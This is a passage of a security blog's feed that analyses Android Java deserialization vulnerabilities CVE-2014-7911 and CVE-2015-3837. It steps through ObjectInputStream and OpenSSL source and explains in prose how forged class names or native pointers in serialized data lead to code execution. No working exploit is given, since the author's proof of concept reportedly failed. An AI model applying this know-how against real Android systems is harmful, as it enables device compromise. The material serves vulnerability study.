            vlist.doCallbacks();
        }
        return obj;
    } finally {
        passHandle = outerHandle;
        if (closed &amp;amp;&amp;amp; depth == 0) {
            clear();
        }
    }
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Step into &lt;code&gt;Object obj = readObject0(false)&lt;/code&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-java&#34;&gt;/**
 * Underlying readObject implementation.
 */
private Object readObject0(boolean unshared) throws IOException {

    ...

    byte tc;
    // TC_RESET = 121 = 0x79
    while ((tc = bin.peekByte()) == TC_RESET) {
        bin.readByte();
        handleReset();
    }

    depth++;

    ...

}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;img src=&#34;https://zeqiii.github.io/img/analysis_of_java_serialization/tc_reset.png&#34; alt=&#34;tc_reset&#34; /&gt;&lt;/p&gt;

&lt;p&gt;In obj.bin, there is no &lt;code&gt;TC_RESET&lt;/code&gt;, so let&amp;rsquo;s continue.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-java&#34;&gt;private Object readObject0(boolean unshared) throws IOException {
    
    ...

    depth++;
    try {
        switch (tc) {
            case TC_NULL:
                return readNull();

            ...

            // TC_OBJECT = 115 = 0x73
            case TC_OBJECT:
                return checkResolve(readOrdinaryObject(unshared));

            default:
                throw new StreamCorruptedException(
                    String.format(&amp;quot;invalid type code: %02X&amp;quot;, tc));
        }
    } finally {
        depth--;
        bin.setBlockDataMode(oldMode);
    }
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;img src=&#34;https://zeqiii.github.io/img/analysis_of_java_serialization/tc_reset.png&#34; alt=&#34;tc_reset&#34; /&gt;&lt;/p&gt;

&lt;p&gt;0x73 equals &lt;code&gt;TC_OBJECT&lt;/code&gt;, so next we step into &lt;code&gt;readOrdinaryObject(unshared)&lt;/code&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-java&#34;&gt;private Object readOrdinaryObject(boolean unshared) throws IOException
{
    if (bin.readByte() != TC_OBJECT) {
        throw new InternalError();
    }

    ObjectStreamClass desc = readClassDesc(false);
    desc.checkDeserialize();

    ...

}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;img src=&#34;https://zeqiii.github.io/img/analysis_of_java_serialization/tc_reset.png&#34; alt=&#34;tc_reset&#34; /&gt;&lt;/p&gt;

&lt;p&gt;Step into `readClassDesc(false)&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-java&#34;&gt;/**
 * Reads in and returns (possibly null) class descriptor.  Sets passHandle
 * to class descriptor&#39;s assigned handle.  If class descriptor cannot be
 * resolved to a class in the local VM, a ClassNotFoundException is
 * associated with the class descriptor&#39;s handle.
 */
private ObjectStreamClass readClassDesc(boolean unshared) throws IOException
{
    byte tc = bin.peekByte();
    switch (tc) {
        case TC_NULL:
            return (ObjectStreamClass) readNull();

        case TC_REFERENCE:
            return (ObjectStreamClass) readHandle(unshared);

        case TC_PROXYCLASSDESC:
            return readProxyDesc(unshared);
        
        // TC_CLASSDESC = 114 = 0x72
        case TC_CLASSDESC:
            return readNonProxyDesc(unshared);

        default:
            throw new StreamCorruptedException(
                String.format(&amp;quot;invalid type code: %02X&amp;quot;, tc));
    }
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;img src=&#34;https://zeqiii.github.io/img/analysis_of_java_serialization/class_desc.png&#34; alt=&#34;class desc&#34; /&gt;&lt;/p&gt;

&lt;p&gt;Step into &lt;code&gt;readNonProxyDesc(unshared)&lt;/code&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-java&#34;&gt;private ObjectStreamClass readNonProxyDesc(boolean unshared)
    throws IOException
{
    if (bin.readByte() != TC_CLASSDESC) {
        throw new InternalError();
    }

    ObjectStreamClass desc = new ObjectStreamClass();
    int descHandle = handles.assign(unshared ? unsharedMarker : desc);
    passHandle = NULL_HANDLE;

    ObjectStreamClass readDesc = null;
    try {
        readDesc = readClassDescriptor();
    } catch (ClassNotFoundException ex) {
        throw (IOException) new InvalidClassException(
            &amp;quot;failed to read class descriptor&amp;quot;).initCause(ex);
    }

    ...

}

&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Step into &lt;code&gt;readClassDescriptor()&lt;/code&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-java&#34;&gt;/**
 * Read a class descriptor from the serialization stream.  This method is
 * called when the ObjectInputStream expects a class descriptor as the next
 * item in the serialization stream.  Subclasses of ObjectInputStream may
 * override this method to read in class descriptors that have been written
 * in non-standard formats (by subclasses of ObjectOutputStream which have
 * overridden the &amp;lt;code&amp;gt;writeClassDescriptor&amp;lt;/code&amp;gt; method).  By default,
 * this method reads class descriptors according to the format defined in
 * the Object Serialization specification.
 *
 * @return  the class descriptor read
 * @throws  IOException If an I/O error has occurred.
 * @throws  ClassNotFoundException If the Class of a serialized object used
 *          in the class descriptor representation cannot be found
 * @see java.io.ObjectOutputStream#writeClassDescriptor(java.io.ObjectStreamClass)
 * @since 1.3
 */
protected ObjectStreamClass readClassDescriptor() throws IOException, ClassNotFoundException
{
    ObjectStreamClass desc = new ObjectStreamClass();
    desc.readNonProxy(this);
    return desc;
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Step into &lt;code&gt;desc.readNonProxy(this)&lt;/code&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-java&#34;&gt;void readNonProxy(ObjectInputStream in) throws IOException, ClassNotFoundException
{
    name = in.readUTF();
    suid = Long.valueOf(in.readLong());
    isProxy = false;

    byte flags = in.readByte();
    hasWriteObjectData =
        ((flags &amp;amp; ObjectStreamConstants.SC_WRITE_METHOD) != 0);
    hasBlockExternalData =
        ((flags &amp;amp; ObjectStreamConstants.SC_BLOCK_DATA) != 0);
    externalizable =
        ((flags &amp;amp; ObjectStreamConstants.SC_EXTERNALIZABLE) != 0);
    boolean sflag =
        ((flags &amp;amp; ObjectStreamConstants.SC_SERIALIZABLE) != 0);
    if (externalizable &amp;amp;&amp;amp; sflag) {
        throw new InvalidClassException(
            name, &amp;quot;serializable and externalizable flags conflict&amp;quot;);
    }
    serializable = externalizable || sflag;
    isEnum = ((flags &amp;amp; ObjectStreamConstants.SC_ENUM) != 0);
    if (isEnum &amp;amp;&amp;amp; suid.longValue() != 0L) {
        throw new InvalidClassException(name,
            &amp;quot;enum descriptor has non-zero serialVersionUID: &amp;quot; + suid);
    }

    int numFields = in.readShort();
    if (isEnum &amp;amp;&amp;amp; numFields != 0) {
        throw new InvalidClassException(name,
            &amp;quot;enum descriptor has non-zero field count: &amp;quot; + numFields);
    }
    fields = (numFields &amp;gt; 0) ?
        new ObjectStreamField[numFields] : NO_FIELDS;
    for (int i = 0; i &amp;lt; numFields; i++) {
        char tcode = (char) in.readByte();
        String fname = in.readUTF();
        String signature = ((tcode == &#39;L&#39;) || (tcode == &#39;[&#39;)) ?
            in.readTypeString() : new String(new char[] { tcode });
        try {
            fields[i] = new ObjectStreamField(fname, signature, false);
        } catch (RuntimeException e) {
            throw (IOException) new InvalidClassException(name,
                &amp;quot;invalid descriptor for field &amp;quot; + fname).initCause(e);
        }
    }
    computeFieldOffsets();
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;code&gt;in.readUTF()&lt;/code&gt; read a &lt;code&gt;String&lt;/code&gt; from the stream and give it to &lt;code&gt;name&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://zeqiii.github.io/img/analysis_of_java_serialization/read_utf.png&#34; alt=&#34;read_utf&#34; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;code&gt;in.readLong()&lt;/code&gt; read a 64 bit &lt;code&gt;Long&lt;/code&gt; and give it to &lt;code&gt;suid&lt;/code&gt;. This long value is just the &lt;code&gt;MySerial.serialVersionUID&lt;/code&gt; in our demo.&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://zeqiii.github.io/img/analysis_of_java_serialization/read_long.png&#34; alt=&#34;read_long&#34; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;code&gt;byte flags = in.readByte();&lt;/code&gt; we get the flags &lt;code&gt;0x02&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://zeqiii.github.io/img/analysis_of_java_serialization/read_byte.png&#34; alt=&#34;read_byte&#34; /&gt;&lt;/p&gt;

&lt;p&gt;Step over to &lt;code&gt;serializable = externalizable || sflag;&lt;/code&gt;, the value of &lt;code&gt;serializable&lt;/code&gt; is set to true.&lt;/p&gt;

&lt;p&gt;Step over to &lt;code&gt;int numFields = in.readShort();&lt;/code&gt;, the value of numFields is 2.&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://zeqiii.github.io/img/analysis_of_java_serialization/read_short.png&#34; alt=&#34;read_short&#34; /&gt;&lt;/p&gt;

&lt;p&gt;Then read two fields.&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://zeqiii.github.io/img/analysis_of_java_serialization/read_field.png&#34; alt=&#34;read_field&#34; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;code&gt;computeFieldOffsets()&lt;/code&gt; calculates and sets serializable field offsets, as well as primitive data size and object field count totals.&lt;/p&gt;

&lt;p&gt;Return to &lt;code&gt;readNonProxyDesc()&lt;/code&gt;, now we&amp;rsquo;ve got an object of ObjectStreamClass, &lt;code&gt;readDesc&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-java&#34;&gt;private ObjectStreamClass readNonProxyDesc(boolean unshared) {
    
    ...

    Class cl = null;
    ClassNotFoundException resolveEx = null;
    bin.setBlockDataMode(true);

    // Return true if this class is a custom subclass of ObjectInputStream
    final boolean checksRequired = isCustomSubclass();
    try {
        if ((cl = resolveClass(readDesc)) == null) {
            resolveEx = new ClassNotFoundException(&amp;quot;null class&amp;quot;);
        } else if (checksRequired) {
            ReflectUtil.checkPackageAccess(cl);
        }
    } catch (ClassNotFoundException ex) {
        resolveEx = ex;
    }
    skipCustomData();

    desc.initNonProxy(readDesc, cl, resolveEx, readClassDesc(false));

    handles.finish(descHandle);
    passHandle = descHandle;
    return desc;
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Step into &lt;code&gt;resolveClass(readDesc)&lt;/code&gt; we can find this, which is vulnerable:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-java&#34;&gt;// get class name, which can b modified by an attacker
String name = desc.getName();
// according to the class name, get the Class object
return Class.forName(name, false, latestUserDefinedLoader());
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;So after we step out from &lt;code&gt;resolveClass(readDesc)&lt;/code&gt;, we step into &lt;code&gt;skipCustomData()&lt;/code&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-java&#34;&gt;/**
 * Skips over all block data and objects until TC_ENDBLOCKDATA is
 * encountered.
 */
private void skipCustomData() throws IOException {
    int oldHandle = passHandle;
    for (;;) {
        if (bin.getBlockDataMode()) {
            bin.skipBlockData();
            bin.setBlockDataMode(false);
        }
        switch (bin.peekByte()) {
            case TC_BLOCKDATA:
            case TC_BLOCKDATALONG:
                bin.setBlockDataMode(true);
                break;

            // TC_ENDBLOCKDATA = 120 = 0x78
            case TC_ENDBLOCKDATA:
                bin.readByte();
                passHandle = oldHandle;
                return;

            default:
                readObject0(false);
                break;
        }
    }
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;img src=&#34;https://zeqiii.github.io/img/analysis_of_java_serialization/tc_endblockdata.png&#34; alt=&#34;tc endblockdata&#34; /&gt;&lt;/p&gt;

&lt;p&gt;Return to &lt;code&gt;readNonProxyDesc()&lt;/code&gt;, we step into &lt;code&gt;desc.initNonProxy(readDesc, cl, resolveEx, readClassDesc(false));&lt;/code&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-java&#34;&gt;void initNonProxy(ObjectStreamClass model,
                      Class&amp;lt;?&amp;gt; cl,
                      ClassNotFoundException resolveEx,
                      ObjectStreamClass superDesc)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Firstly, we step into &lt;code&gt;readClassDesc(false)&lt;/code&gt;, according to the definition of &lt;code&gt;initNonProxy&lt;/code&gt;, we know this is for reading the description of the serializable object&amp;rsquo;s super class description.&lt;/p&gt;

&lt;p&gt;The &lt;code&gt;readClassDesc(false)&lt;/code&gt; is the same as above, but falls in case &lt;code&gt;TC_NULL&lt;/code&gt;, which means the serializable object has no super class.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-java&#34;&gt;// TC_NULL = 112 = 0x70
case TC_NULL:
    return (ObjectStreamClass) readNull()
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;img src=&#34;https://zeqiii.github.io/img/analysis_of_java_serialization/tc_null.png&#34; alt=&#34;tc null&#34; /&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-java&#34;&gt;/**
 * Initializes class descriptor representing a non-proxy class.
 */
void initNonProxy(ObjectStreamClass model,
                  Class&amp;lt;?&amp;gt; cl,
                  ClassNotFoundException resolveEx,
                  ObjectStreamClass superDesc) throws InvalidClassException
{
    // init this object from model
    this.cl = cl;
    this.resolveEx = resolveEx;
    this.superDesc = superDesc;
    name = model.name;
    suid = Long.valueOf(model.getSerialVersionUID());
    isProxy = false;
    isEnum = model.isEnum;
    serializable = model.serializable;
    externalizable = model.externalizable;
    hasBlockExternalData = model.hasBlockExternalData;
    hasWriteObjectData = model.hasWriteObjectData;
    fields = model.fields;
    primDataSize = model.primDataSize;
    numObjFields = model.numObjFields;

    if (cl != null) {

        // important, looks up and returns class descriptor for a given class
        localDesc = lookup(cl, true);

        // beginning of validations
        if (localDesc.isProxy) {
            throw new InvalidClassException(
                &amp;quot;cannot bind non-proxy descriptor to a proxy class&amp;quot;);
        }
        if (isEnum != localDesc.isEnum) {
            throw new InvalidClassException(isEnum ?
                &amp;quot;cannot bind enum descriptor to a non-enum class&amp;quot; :
                &amp;quot;cannot bind non-enum descriptor to an enum class&amp;quot;);
        }

        if (serializable == localDesc.serializable &amp;amp;&amp;amp;
            !cl.isArray() &amp;amp;&amp;amp;
            suid.longValue() != localDesc.getSerialVersionUID())
        {
            throw new InvalidClassException(localDesc.name,
                &amp;quot;local class incompatible: &amp;quot; +
                &amp;quot;stream classdesc serialVersionUID = &amp;quot; + suid +
                &amp;quot;, local class serialVersionUID = &amp;quot; +
                localDesc.getSerialVersionUID());
        }

        if (!classNamesEqual(name, localDesc.name)) {
            throw new InvalidClassException(localDesc.name,
                &amp;quot;local class name incompatible with stream class &amp;quot; +
                &amp;quot;name \&amp;quot;&amp;quot; + name + &amp;quot;\&amp;quot;&amp;quot;);
        }

        if (!isEnum) {
            if ((serializable == localDesc.serializable) &amp;amp;&amp;amp;
                (externalizable != localDesc.externalizable))
            {
                throw new InvalidClassException(localDesc.name,
                    &amp;quot;Serializable incompatible with Externalizable&amp;quot;);
            }

            if ((serializable != localDesc.serializable) ||
                (externalizable != localDesc.externalizable) ||
                !(serializable || externalizable))
            {
                deserializeEx = new ExceptionInfo(
                    localDesc.name, &amp;quot;class invalid for deserialization&amp;quot;);
            }
        }
        // ending of validations

        // Constructor of MySerial !!!
        cons = localDesc.cons;
        writeObjectMethod = localDesc.writeObjectMethod;
        readObjectMethod = localDesc.readObjectMethod;
        readObjectNoDataMethod = localDesc.readObjectNoDataMethod;
        writeReplaceMethod = localDesc.writeReplaceMethod;
        readResolveMethod = localDesc.readResolveMethod;
        if (deserializeEx == null) {
            deserializeEx = localDesc.deserializeEx;
        }
    }
    fieldRefl = getReflector(fields, localDesc);
    // reassign to matched fields so as to reflect local unshared settings
    fields = fieldRefl.getFields();
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;code&gt;desc.initNonProxy()&lt;/code&gt; will initialize &lt;code&gt;desc&lt;/code&gt;, which will be returned. It read the fields values of the parameter &lt;code&gt;model&lt;/code&gt;, and init &lt;code&gt;desc&lt;/code&gt;&amp;rsquo;s fields with these values. It also find a local class descriptor of parameter &lt;code&gt;cl&lt;/code&gt; from local cache, and read the fields values of it, and init &lt;code&gt;desc&lt;/code&gt;&amp;rsquo;s fields with these values.&lt;/p&gt;

&lt;p&gt;Then the initiated &lt;code&gt;desc&lt;/code&gt; will finally be returned to &lt;code&gt;readOrdinaryObject(unshared)&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-java&#34;&gt;private Object readOrdinaryObject(boolean unshared) throws IOException {

    ... // get an ObjectStreamClass, here we get the returned desc.

    Class&amp;lt;?&amp;gt; cl = desc.forClass();
    if (cl == String.class || cl == Class.class
            || cl == ObjectStreamClass.class) {
        throw new InvalidClassException(&amp;quot;invalid class descriptor&amp;quot;);
    }

    Object obj;
    try {
        // if desc.cons != null, isInstantiable() returns true
        // desc.newInstance() returns desc.cons.newInstance()
        // this is like calling the constructor of MySerial
        obj = desc.isInstantiable() ? desc.newInstance() : null;
    } catch (Exception ex) {
        throw (IOException) new InvalidClassException(
            desc.forClass().getName(),
            &amp;quot;unable to create instance&amp;quot;).initCause(ex);
    }

    passHandle = handles.assign(unshared ? unsharedMarker : obj);
    ClassNotFoundException resolveEx = desc.getResolveException();
    if (resolveEx != null) {
        handles.markException(passHandle, resolveEx);
    }

    if (desc.isExternalizable()) {
        readExternalData((Externalizable) obj, desc);
    } else {
        // read field data from obj.bin
        readSerialData(obj, desc);
    }

    handles.finish(passHandle);

    if (obj != null &amp;amp;&amp;amp;
        handles.lookupException(passHandle) == null &amp;amp;&amp;amp;
        desc.hasReadResolveMethod())
    {
        Object rep = desc.invokeReadResolve(obj);
        if (unshared &amp;amp;&amp;amp; rep.getClass().isArray()) {
            rep = cloneArray(rep);
        }
        if (rep != obj) {
            handles.setObject(passHandle, obj = rep);
        }
    }

    return obj;
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;img src=&#34;https://zeqiii.github.io/img/analysis_of_java_serialization/fields.png&#34; alt=&#34;field values&#34; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://zeqiii.github.io/img/analysis_of_java_serialization/readObject.png&#34; alt=&#34;read object&#34; /&gt;&lt;/p&gt;

&lt;h3 id=&#34;thinking-with-cve-2014-7911:68a7f84eae0d34438ed8064af9699a4b&#34;&gt;Thinking with CVE-2014-7911&lt;/h3&gt;

&lt;p&gt;To leverage this vulnerability, one of the steps is to change &lt;code&gt;AAdroid&lt;/code&gt; to &lt;code&gt;android&lt;/code&gt; in the serialized data, so that &lt;code&gt;readObject()&lt;/code&gt; create a new &lt;code&gt;android.os.BinderProxy&lt;/code&gt; object with the fields &lt;code&gt;mArgs&lt;/code&gt; and &lt;code&gt;mOrgs&lt;/code&gt; being set as the value of the fake &lt;code&gt;AAdroid.os.BinderProxy&lt;/code&gt; object.&lt;/p&gt;

&lt;p&gt;So, the problem is because of the improper validation during deserialzation. By changing the class name fields of the serialized data, attacker can misguide Java to create arbitrary class.&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>Analysis of cve-2015-3837</title>
      <link>https://zeqiii.github.io/2016/03/07/analysis-of-cve-2015-3837/</link>
      <pubDate>Mon, 07 Mar 2016 20:45:41 +0800</pubDate>
      <author>zeqiii@163.com (zeqi)</author>
      <guid>https://zeqiii.github.io/2016/03/07/analysis-of-cve-2015-3837/</guid>
      <description>

&lt;h2 id=&#34;introduction&#34;&gt;Introduction&lt;/h2&gt;

&lt;p&gt;CVE-2015-3837 is another java deserialzation vulnerability in android. &lt;a href=&#34;http://drops.wooyun.org/papers/10235&#34;&gt;Wooyun&lt;/a&gt; had analyzed it.&lt;/p&gt;

&lt;h2 id=&#34;description-on-cve&#34;&gt;Description on CVE&lt;/h2&gt;

&lt;blockquote&gt;
&lt;p&gt;The OpenSSLX509Certificate class in org/conscrypt/OpenSSLX509Certificate.java in Android before 5.1.1 LMY48I improperly includes certain context data during serialization and deserialization, which allows attackers to execute arbitrary code via an application that sends a crafted Intent, aka internal bug 21437603.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;We know that Google had patched the bug disclosed in CVE-2014-7911, in which &lt;code&gt;ObjectInputStream&lt;/code&gt; didn&amp;rsquo;t validate an object can be serialzed or not. The bug can be used to create arbitrary object by deserialization, even the object is not a serializable object, such as &lt;code&gt;android.os.BinderProxy&lt;/code&gt;. After being patched, an object will be checked whether it is serializable before deserialization. But if there is an serializable class which overrides &lt;code&gt;finalize()&lt;/code&gt; method like BinderProxy, the attacker can still leverage it to execute arbitrary code.&lt;/p&gt;

&lt;h2 id=&#34;finalize-of-opensslx509certificate&#34;&gt;finalize() of OpenSSLX509Certificate&lt;/h2&gt;

&lt;p&gt;The location of OpenSSLX509Certificate.java is &lt;code&gt;/external/conscrypt/src/main/java/org/conscrypt/OpenSSLX509Certificate.java&lt;/code&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-java&#34;&gt;@Override
protected void finalize() throws Throwable {
    try {
        if (mContext != 0) {
            NativeCrypto.X509_free(mContext);
        }
    } finally {
        super.finalize();
    }
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;In NativeCrypto.java&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-java&#34;&gt;public static native void X509_free(long x509ctx);
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;In org_conscrypt_NativeCrypto.cpp&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-c&#34;&gt;static void NativeCrypto_X509_free(JNIEnv* env, jclass, jlong x509Ref) {

    // cast the mContext to a pointer of X509 struct
    X509* x509 = reinterpret_cast&amp;lt;X509*&amp;gt;(static_cast&amp;lt;uintptr_t&amp;gt;(x509Ref));
    JNI_TRACE(&amp;quot;X509_free(%p)&amp;quot;, x509);

    if (x509 == NULL) {
        jniThrowNullPointerException(env, &amp;quot;x509 == null&amp;quot;);
        JNI_TRACE(&amp;quot;X509_free(%p) =&amp;gt; x509 == null&amp;quot;, x509);
            return;
    }
    X509_free(x509);
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Here, I encountered some difficulties finding the definition of &lt;code&gt;X509_free&lt;/code&gt;, so I have to look &lt;a href=&#34;http://drops.wooyun.org/papers/10235&#34;&gt;Wooyun&lt;/a&gt; for help. It said that X509_free is defined by nested macros which starts at &lt;code&gt;IMPLEMENT_ASN1_FUNCTIONS(X509)&lt;/code&gt; in &lt;code&gt;crypto/asn1/x_x509.c&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;I downloaded openssl source code from &lt;a href=&#34;https://github.com/openssl/openssl&#34;&gt;GitHub&lt;/a&gt; and found it in &lt;code&gt;crypto/x509/X_x509.c&lt;/code&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-c&#34;&gt;IMPLEMENT_ASN1_FUNCTIONS(X509)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;In &lt;code&gt;include/openssl/Asn1t.h&lt;/code&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-c&#34;&gt;# define IMPLEMENT_ASN1_FUNCTIONS(stname) IMPLEMENT_ASN1_FUNCTIONS_fname(stname, stname, stname)

# define IMPLEMENT_ASN1_FUNCTIONS_fname(stname, itname, fname) \
        IMPLEMENT_ASN1_ENCODE_FUNCTIONS_fname(stname, itname, fname) \
        IMPLEMENT_ASN1_ALLOC_FUNCTIONS_fname(stname, itname, fname)

# define IMPLEMENT_ASN1_ALLOC_FUNCTIONS_fname(stname, itname, fname) \
        stname *fname##_new(void) \
        { \
                return (stname *)ASN1_item_new(ASN1_ITEM_rptr(itname)); \
        } \
        void fname##_free(stname *a) \
        { \
                ASN1_item_free((ASN1_VALUE *)a, ASN1_ITEM_rptr(itname)); \
        }

# define IMPLEMENT_ASN1_ENCODE_FUNCTIONS_fname(stname, itname, fname) \
        stname *d2i_##fname(stname **a, const unsigned char **in, long len) \
        { \
                return (stname *)ASN1_item_d2i((ASN1_VALUE **)a, in, len, ASN1_ITEM_rptr(itname));\
        } \
        int i2d_##fname(stname *a, unsigned char **out) \
        { \
                return ASN1_item_i2d((ASN1_VALUE *)a, out, ASN1_ITEM_rptr(itname));\
        }
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;So &lt;code&gt;IMPLEMENT_ASN1_FUNCTIONS(X509)&lt;/code&gt; equals &lt;code&gt;IMPLEMENT_ASN1_FUNCTIONS_fname(X509, X509, X509)&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;Which equals &lt;code&gt;IMPLEMENT_ASN1_ENCODE_FUNCTIONS_fname(X509, X509, X509);IMPLEMENT_ASN1_ALLOC_FUNCTIONS_fname(X509, X509, X509)&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;Which equals&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-c&#34;&gt;/* encode functions omitted */

X509 *X509_new(void)
{
        return (stname *)ASN1_item_new(ASN1_ITEM_rptr(X509));
}
void X509_free(X509 *a)
{
        ASN1_item_free((ASN1_VALUE *)a, ASN1_ITEM_rptr(X509));
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;So this is how &lt;code&gt;X509_free()&lt;/code&gt; is defined by macros.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-c&#34;&gt;void ASN1_item_free(ASN1_VALUE *val, const ASN1_ITEM *it)
{
    asn1_item_embed_free(&amp;amp;val, it, 0);
}

static void asn1_item_embed_free(ASN1_VALUE **pval, const ASN1_ITEM *it, int embed)
{
    const ASN1_TEMPLATE *tt = NULL, *seqtt;
    const ASN1_EXTERN_FUNCS *ef;
    const ASN1_AUX *aux = it-&amp;gt;funcs;
    ASN1_aux_cb *asn1_cb;
    int i;

    if (!pval)
        return;
    if ((it-&amp;gt;itype != ASN1_ITYPE_PRIMITIVE) &amp;amp;&amp;amp; !*pval)
        return;
    if (aux &amp;amp;&amp;amp; aux-&amp;gt;asn1_cb)
        asn1_cb = aux-&amp;gt;asn1_cb;
    else
        asn1_cb = 0;

    switch (it-&amp;gt;itype) {

    case ASN1_ITYPE_PRIMITIVE:
        if (it-&amp;gt;templates)
            asn1_template_free(pval, it-&amp;gt;templates);
        else
            asn1_primitive_free(pval, it);
        break;

    case ASN1_ITYPE_MSTRING:
        asn1_primitive_free(pval, it);
        break;

    case ASN1_ITYPE_CHOICE:
        if (asn1_cb) {
            i = asn1_cb(ASN1_OP_FREE_PRE, pval, it, NULL);
            if (i == 2)
                return;
        }
        i = asn1_get_choice_selector(pval, it);
        if ((i &amp;gt;= 0) &amp;amp;&amp;amp; (i &amp;lt; it-&amp;gt;tcount)) {
            ASN1_VALUE **pchval;

            tt = it-&amp;gt;templates + i;
            pchval = asn1_get_field_ptr(pval, tt);
            asn1_template_free(pchval, tt);
        }
        if (asn1_cb)
            asn1_cb(ASN1_OP_FREE_POST, pval, it, NULL);
        if (embed == 0) {
            OPENSSL_free(*pval);
            *pval = NULL;
        }
        break;

    case ASN1_ITYPE_EXTERN:
        ef = it-&amp;gt;funcs;
        if (ef &amp;amp;&amp;amp; ef-&amp;gt;asn1_ex_free)
            ef-&amp;gt;asn1_ex_free(pval, it);
        break;

    case ASN1_ITYPE_NDEF_SEQUENCE:
    case ASN1_ITYPE_SEQUENCE:
        if (asn1_do_lock(pval, -1, it) &amp;gt; 0)
            return;
        if (asn1_cb) {
            i = asn1_cb(ASN1_OP_FREE_PRE, pval, it, NULL);
            if (i == 2)
                return;
        }
        asn1_enc_free(pval, it);
        /*
         * If we free up as normal we will invalidate any ANY DEFINED BY
         * field and we wont be able to determine the type of the field it
         * defines. So free up in reverse order.
         */
        tt = it-&amp;gt;templates + it-&amp;gt;tcount - 1;
        for (i = 0; i &amp;lt; it-&amp;gt;tcount; tt--, i++) {
            ASN1_VALUE **pseqval;
            seqtt = asn1_do_adb(pval, tt, 0);
            if (!seqtt)
                continue;
            pseqval = asn1_get_field_ptr(pval, seqtt);
            asn1_template_free(pseqval, seqtt);
        }
        if (asn1_cb)
            asn1_cb(ASN1_OP_FREE_POST, pval, it, NULL);
        if (embed == 0) {
            OPENSSL_free(*pval);
            *pval = NULL;
        }
        break;
    }
}

&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&#34;poc&#34;&gt;POC&lt;/h2&gt;

&lt;p&gt;I write the POC by modifying cve-2014-7911&amp;rsquo;s POC, but it didn&amp;rsquo;t work. I&amp;rsquo;ll continue working on it.&lt;/p&gt;

&lt;h2 id=&#34;google-s-patch&#34;&gt;Google&amp;rsquo;s Patch&lt;/h2&gt;

&lt;p&gt;To patch this vulnerability, Google just adds &amp;laquo;transient&amp;raquo; before the definition of the field &lt;code&gt;OpenSSLX509Certificate.mContext&lt;/code&gt;, in order to disable it to be serialized.&lt;/p&gt;

&lt;h2 id=&#34;related-papers&#34;&gt;Related Papers&lt;/h2&gt;

&lt;p&gt;I&amp;rsquo;ve read the paper &lt;a href=&#34;https://www.usenix.org/conference/woot15/workshop-program/presentation/peles&#34;&gt;One Class to Rule Them All&lt;/a&gt;, where this vulnerability disclosure to public. In this paper, a method is raised to find the vulnerable classes automatically, by defining some criterias and implementing a JDI to check on them. For how to debugging Java programs using Java code, read &lt;a href=&#34;https://zeqiii.github.io/2016/03/10/methods-of-debugging-java-programs/&#34;&gt;Methods of Debugging Java Programs&lt;/a&gt;&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>Analysis of cve-2015-6420</title>
      <link>https://zeqiii.github.io/2016/03/05/analysis-of-cve-2015-6420/</link>
      <pubDate>Sat, 05 Mar 2016 19:41:52 +0800</pubDate>
      <author>zeqiii@163.com (zeqi)</author>
